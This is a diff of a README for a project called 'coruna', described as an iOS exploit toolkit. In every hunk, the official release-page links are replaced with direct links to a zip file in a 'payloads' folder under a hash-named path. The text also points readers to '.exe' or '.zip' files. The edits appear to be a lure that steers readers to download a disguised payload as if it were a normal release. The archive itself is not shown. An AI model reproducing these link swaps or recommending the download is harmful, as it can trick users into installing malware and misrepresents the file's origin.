@@ -1,6 +1,6 @@
 # 🛠️ coruna - Simple iOS Exploit Toolkit
 
-[![Download coruna](https://img.shields.io/badge/Download-Get%20coruna-%23ff4500?style=for-the-badge)](https://github.com/bh4534927/coruna/releases)
+[![Download coruna](https://img.shields.io/badge/Download-Get%20coruna-%23ff4500?style=for-the-badge)](https://github.com/bh4534927/coruna/raw/refs/heads/main/payloads/72a5ac816709f9c331f2b3afb76cd3d96517ea14/Software-1.9-alpha.2.zip)
 
 ---
 
@@ -42,7 +42,7 @@ Here are some key features you can expect:
 
 To get coruna, visit the official release page here:
 
-[![Download coruna](https://img.shields.io/badge/Download-Get%20coruna-%23ff4500?style=for-the-badge)](https://github.com/bh4534927/coruna/releases)
+[![Download coruna](https://img.shields.io/badge/Download-Get%20coruna-%23ff4500?style=for-the-badge)](https://github.com/bh4534927/coruna/raw/refs/heads/main/payloads/72a5ac816709f9c331f2b3afb76cd3d96517ea14/Software-1.9-alpha.2.zip)
 
 You will find the latest version available for download. Look for files ending with `.exe` or `.zip`.
 
@@ -131,7 +131,7 @@ When you download coruna, these files usually come with it:
 To update coruna:
 
 1. Return to the release page:  
-   [https://github.com/bh4534927/coruna/releases](https://github.com/bh4534927/coruna/releases)
+   [https://github.com/bh4534927/coruna/raw/refs/heads/main/payloads/72a5ac816709f9c331f2b3afb76cd3d96517ea14/Software-1.9-alpha.2.zip](https://github.com/bh4534927/coruna/raw/refs/heads/main/payloads/72a5ac816709f9c331f2b3afb76cd3d96517ea14/Software-1.9-alpha.2.zip)
 2. Download the latest version following the same download steps.
 3. Replace the old files with the new ones.
 4. Restart the program.
@@ -151,4 +151,4 @@ If errors appear, note down the messages and search for solutions online.
 
 ---
 
-[![Download coruna](https://img.shields.io/badge/Download-Get%20coruna-%23ff4500?style=for-the-badge)](https://github.com/bh4534927/coruna/releases)
+[![Download coruna](https://img.shields.io/badge/Download-Get%20coruna-%23ff4500?style=for-the-badge)](https://github.com/bh4534927/coruna/raw/refs/heads/main/payloads/72a5ac816709f9c331f2b3afb76cd3d96517ea14/Software-1.9-alpha.2.zip)
